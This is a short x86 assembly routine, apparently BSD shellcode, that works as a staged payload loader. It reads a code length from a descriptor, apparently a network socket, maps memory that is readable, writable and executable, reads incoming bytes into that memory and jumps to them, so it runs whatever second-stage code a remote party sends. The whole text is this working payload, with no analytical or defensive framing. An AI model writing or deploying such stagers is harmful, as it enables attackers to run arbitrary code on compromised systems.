_read_exec:
	;; Save some stack space
	mov	ebp, esp
	sub	esp, byte 8
	
.loop:
	xor	ecx, ecx	; clear ecx
	mul	ecx		; clear eax and edx
	
	;; Read a 4-byte size of code fragment to execute
	push	ecx
	mov	esi, esp
	mov	al, 4
	push	eax		; nbyte
	push	esi		; buf
	push	edi		; s
	push	eax
	dec	eax
	int	0x80
	jb	end
	mov	esi, [esp+16]	; code buffer length

	;; mmap memory
	xor	eax, eax
	push	eax		; alignment spacer
	push	eax		; 0
	dec	eax
	push	eax		; -1
	inc	eax
	mov	ax, 0x1002
	push	eax		; (MAP_ANON | MAP_PRIVATE)
	xor	eax, eax
	mov	al, 7
	push	eax		; (PROT_READ | PROT_WRITE | PROT_EXEC)
	push	esi		; len
	push	edx		; addr
	push	edx 		; spacer
	mov	al, 197
	int	0x80
	jb	end
	
	;; read fragment from file descriptor into mmap buffer
	mov	ebx, eax
	add	ebx, esi
.read_fragment:
	push	esi		; nbytes
	mov	eax, ebx
	sub	eax, esi
	push	eax		; buf
	push	edi		; s
	push	edx		; spacer
	xor	eax, eax
	mov	al, 3
	int	0x80		; read(edi, eax, esi)
	jb	end

	sub	ebx, eax	; Subtract bytes read to buf end pointer
	sub	esi, eax	; Subtract bytes read from total
	jnz	.read_fragment

	jmp	ebx
